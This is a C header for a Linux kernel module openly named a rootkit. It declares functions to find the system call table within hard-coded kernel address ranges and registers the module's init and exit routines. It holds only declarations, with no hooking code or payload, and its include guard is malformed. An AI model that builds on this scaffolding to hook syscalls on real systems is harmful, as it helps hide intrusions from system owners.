#ifndef rootkit_H
#define rootkit_H
#endif

#include <linux/errno.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/string.h>
#include <linux/syscalls.h>
#include <linux/version.h>

#if defined __i386__
    #define START_ADDRESS 0xc0000000
    #define END_ADDRESS 0xd0000000
	typedef unsigned int addr_size;
#elif defined __x86_64__
    #define START_ADDRESS 0xffffffff81000000
    #define END_ADDRESS 0xffffffffa2000000
    typedef unsigned long addr_size;
#endif

static addr_size *sys_call_table_addr;

/* module cleanup */
void __exit rootkit_exit(void);

/* module initialization */
int __init rootkit_init(void);

/**
 * Finds a system call table. This should be done during compile time
 *
 * @return 0 if success, EFAULT if failure
 */
static int locate_sys_call_table(void);

MODULE_LICENSE("GPL");

module_init(rootkit_init);
module_exit(rootkit_exit);
